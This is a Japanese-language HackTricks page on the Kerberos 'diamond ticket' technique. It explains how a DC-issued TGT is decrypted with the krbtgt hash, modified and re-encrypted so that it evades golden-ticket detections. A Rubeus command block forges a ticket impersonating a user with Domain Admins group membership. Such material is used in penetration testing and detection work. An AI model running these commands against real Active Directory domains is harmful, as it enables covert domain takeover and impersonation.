# ダイヤモンドチケット

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## ダイヤモンドチケット

**ゴールデンチケットのように**、ダイヤモンドチケットは**任意のユーザーとして任意のサービスにアクセスするために使用できるTGT**です。ゴールデンチケットは完全にオフラインで作成され、そのドメインのkrbtgtハッシュで暗号化され、ログオンセッションに渡されて使用されます。ドメインコントローラーは、正当に発行されたTGTを追跡しないため、自身のkrbtgtハッシュで暗号化されたTGTを喜んで受け入れます。

ゴールデンチケットの使用を検出するための一般的な2つの技術があります：

* 対応するAS-REQがないTGS-REQを探します。
* Mimikatzのデフォルトの10年の有効期限のような、ばかげた値を持つTGTを探します。

**ダイヤモンドチケット**は、**DCによって発行された正当なTGTのフィールドを変更することによって作成されます**。これは、**TGTを要求し**、ドメインのkrbtgtハッシュで**復号化し**、チケットの希望するフィールドを**変更し**、その後**再暗号化する**ことによって達成されます。これにより、ゴールデンチケットの前述の2つの欠点を**克服します**：

* TGS-REQには前にAS-REQがあります。
* TGTはDCによって発行されたため、ドメインのKerberosポリシーからのすべての正しい詳細を持っています。これらはゴールデンチケットで正確に偽造することができますが、より複雑でミスが起こりやすいです。
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
